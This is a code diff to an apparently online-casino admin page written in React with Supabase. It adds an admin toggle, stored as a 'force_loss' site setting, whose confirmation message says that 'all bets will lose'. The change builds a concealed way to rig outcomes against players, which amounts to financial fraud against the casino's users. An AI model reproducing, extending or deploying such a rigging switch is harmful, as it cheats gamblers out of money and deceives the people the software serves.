@@ -54,7 +54,26 @@ export default function Admin() {
   useEffect(() => {
     if (!loading && !hasStaffAccess) { navigate("/"); return; }
     if (hasStaffAccess) fetchUsers();
+    if (isAdmin) fetchForceLoss();
   }, [hasStaffAccess, loading]);
+
+  const fetchForceLoss = async () => {
+    const { data } = await supabase.from("site_settings").select("value").eq("key", "force_loss").maybeSingle();
+    setForceLoss(data?.value === true || (data?.value as any)?.enabled === true);
+  };
+
+  const handleToggleForceLoss = async (checked: boolean) => {
+    setForceLossLoading(true);
+    const { data: existing } = await supabase.from("site_settings").select("id").eq("key", "force_loss").maybeSingle();
+    if (existing) {
+      await supabase.from("site_settings").update({ value: { enabled: checked } as any }).eq("key", "force_loss");
+    } else {
+      await supabase.from("site_settings").insert({ key: "force_loss", value: { enabled: checked } as any });
+    }
+    setForceLoss(checked);
+    setForceLossLoading(false);
+    toast.success(checked ? "Force Loss ON — all bets will lose" : "Force Loss OFF — casino runs normally");
+  };
 
   const fetchUsers = async () => {
     setLoadingUsers(true);
